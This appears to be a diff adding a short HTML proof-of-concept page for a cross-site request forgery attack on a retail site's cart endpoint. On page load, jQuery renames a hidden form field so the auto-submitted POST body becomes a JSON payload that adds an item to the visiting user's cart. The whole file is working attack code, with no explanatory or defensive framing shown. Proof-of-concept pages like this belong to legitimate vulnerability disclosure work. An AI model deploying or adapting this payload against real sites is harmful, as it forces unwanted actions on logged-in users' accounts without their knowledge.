@@ -1,0 +1,18 @@
+<html>
+
+<body>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <form id="myform" enctype="application/json" action="http://www.noon.com/_svc/cart-v1/cart/item/e62008625f11124e/1?showCart" method="POST">
+    <input id="json" type="hidden" name='json' value='test"}'>
+  </form>
+  <script>
+    $(document).ready(function () {
+      $("#json").attr("name", '{"offerId":"e62008625f11124e","quantity":1,"attachments":[],"a":"');
+      $("#myform").submit();
+    });
+
+  </script>
+</body>
+
+</html>
